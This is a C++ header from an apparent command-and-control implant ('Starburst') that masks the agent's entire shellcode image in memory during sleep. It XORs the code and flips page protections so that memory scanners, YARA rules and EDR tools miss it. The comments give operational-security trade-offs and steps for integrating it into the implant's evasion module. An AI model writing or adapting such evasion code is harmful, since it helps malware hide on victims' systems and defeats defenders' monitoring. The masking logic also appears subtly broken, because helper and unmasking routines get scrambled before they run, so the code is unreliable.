/*
 * mask_full_image.h - Full shellcode image masking during sleep.
 *
 * Masks the ENTIRE Starburst shellcode image (code + data in .text)
 * during sleep, not just sensitive fields. This defeats memory scanners
 * that look for shellcode signatures, PIC bootstrap stubs, or API
 * hash constants in the agent's memory.
 *
 * MECHANISM:
 *   1. Pre-sleep: flip shellcode pages RW → XOR entire image → flip back RX
 *   2. Sleep (NtDelayExecution)
 *   3. Post-sleep: flip RW → XOR to restore → flip back RX
 *
 * REQUIREMENTS:
 *   - inst.evasion.ekko.img_base must be set (shellcode base address)
 *   - inst.evasion.ekko.img_size must be set (shellcode length)
 *   - inst.evasion.ekko.rc4_key must be initialized (16-byte XOR key)
 *   - VirtualProtect must be resolved on the instance
 *
 * OPSEC:
 *   + Entire shellcode image is encrypted during sleep
 *   + No recognizable code or strings in memory while sleeping
 *   + Defeats YARA rules, signature scans, and string matching
 *   - VirtualProtect calls (RX→RW→RX) generate ETW telemetry
 *   - Memory region permission changes are monitored by some EDRs
 *   - The masking function itself must remain executable (runs from
 *     a stack-copied stub or from a separate allocation)
 *
 * INTEGRATION:
 *   Replace evasion_pre_sleep() and evasion_post_sleep() in evasion.cc
 *   with the functions below. Add the VirtualProtect typedef and resolution
 *   to your instance struct if not already present.
 *
 * LIMITATION:
 *   The masking code itself lives in the shellcode image. To avoid
 *   masking itself mid-execution, the XOR loop skips a small region
 *   around the current instruction pointer. For complete coverage,
 *   use mask_ekko.h which runs the masking from a timer queue callback.
 */

/*
 * XOR the shellcode image with the RC4 key.
 * Operates in-place. Call twice to mask/unmask (symmetric).
 *
 * skip_base / skip_size: region to leave unmasked (the masking
 * function's own code). Set to NULL/0 to mask everything.
 */
static auto declfn xor_image(
    instance& inst,
    uintptr_t skip_base, uint32_t skip_size
) -> void {
    auto base = reinterpret_cast<uint8_t*>( inst.evasion.ekko.img_base );
    auto size = inst.evasion.ekko.img_size;
    auto key  = inst.evasion.ekko.rc4_key;

    for ( uint32_t i = 0; i < size; i++ ) {
        uintptr_t addr = reinterpret_cast<uintptr_t>( base + i );
        if ( skip_base && addr >= skip_base && addr < skip_base + skip_size )
            continue;
        base[i] ^= key[ i % 16 ];
    }
}

/*
 * Flip memory protection for the shellcode region.
 * Returns the old protection value.
 */
static auto declfn flip_protection(
    instance& inst, DWORD new_protect
) -> DWORD {
    typedef BOOL (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

    auto pVirtualProtect = reinterpret_cast<fn_VirtualProtect>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "VirtualProtect" ) ) );

    if ( !pVirtualProtect ) return 0;

    DWORD old_protect = 0;
    pVirtualProtect(
        reinterpret_cast<LPVOID>( inst.evasion.ekko.img_base ),
        inst.evasion.ekko.img_size,
        new_protect,
        &old_protect
    );
    return old_protect;
}

/*
 * evasion_pre_sleep - Full image mask before sleeping.
 *
 * Call this instead of the default xor_sensitive_data().
 */
auto declfn evasion_pre_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;

    /* Also mask sensitive fields (belt and suspenders) */
    xor_sensitive_data( inst );

    /* Flip shellcode region to RW so we can XOR it */
    flip_protection( inst, PAGE_READWRITE );

    /* XOR the entire image, skipping our own function (~256 bytes) */
    uintptr_t self = reinterpret_cast<uintptr_t>( &evasion_pre_sleep );
    xor_image( inst, self, 0x100 );

    /* Flip back to RX (masked but executable - the masked bytes are
       not our code path, we're done with them) */
    flip_protection( inst, PAGE_EXECUTE_READ );
}

/*
 * evasion_post_sleep - Unmask full image after waking.
 */
auto declfn evasion_post_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;

    /* Flip to RW for unmasking */
    flip_protection( inst, PAGE_READWRITE );

    /* XOR again to restore original bytes */
    uintptr_t self = reinterpret_cast<uintptr_t>( &evasion_post_sleep );
    xor_image( inst, self, 0x100 );

    /* Flip back to RX */
    flip_protection( inst, PAGE_EXECUTE_READ );

    /* Unmask sensitive fields */
    xor_sensitive_data( inst );
}
